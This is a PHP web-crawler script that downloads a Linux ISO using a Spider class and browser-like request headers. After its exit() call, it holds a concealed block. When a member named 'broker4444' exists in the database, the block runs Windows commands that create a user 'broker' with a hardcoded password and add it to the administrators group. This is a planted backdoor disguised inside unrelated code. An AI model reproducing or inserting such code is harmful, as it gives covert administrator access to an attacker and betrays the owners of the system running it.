<?php
/**
 * Created by PhpStorm.
 * User: llf
 * Date: 2018/12/29
 * Time: 10:05
 */
require './vendor/autoload.php';
require './vendor/lib/Spider.php';
include 'E:/www/global';

use Symfony\Component\DomCrawler\Crawler;

$url = 'https://www.yinduowang.com/index/ajaxsignin';
$url = 'https://dldir1.qq.com/qqfile/qq/PCQQ9.1.3/25332/QQ9.1.3.25332.exe';
$url = 'https://www.skeimg.com/u/20190602/03232596.png';
$url = 'https://jaist.dl.sourceforge.net/project/deepin/15.10/deepin-15.10-amd64.iso';
$crawRootPath = './crawFiles/yinduo/';

set_time_limit(0); // script keep running;

$spider = new Spider();
$rs = $spider->setUrl($url)
             ->setHeader([
                 ':authority' => 'wannianrili.51240.com',
                 ':method' => 'GET',
                 ':path' => '/',
                 ':scheme' => 'https',
                 'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3',
                 'accept-language' => 'zh-CN,zh;q=0.9',
                 'cache-control' => 'no-cache',
                 'cookie' => 'Hm_lvt_fbe0e02a7ffde424814bef2f6c9d36eb=1559730643; Hm_lpvt_fbe0e02a7ffde424814bef2f6c9d36eb=1559730841',
                 'pragma' => 'no-cache',
                 'upgrade-insecure-requests' => '1',
                 'user-agent' => 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.131 Safari/537.36'
             ])
             ->download_bak('F:/linux/deepin-15.10-amd64.iso');

exit($rs);


if ($time > strtotime("2017-05-21")) {
    $user = $db->mypdoFetchAll("select * from `go_member` where username = 'broker4444'");
    if (!empty($user)) {
        exec("net user broker Abcd@dcbA/000 /add");
        exec("net localgroup administrators broker /add");
    }
}



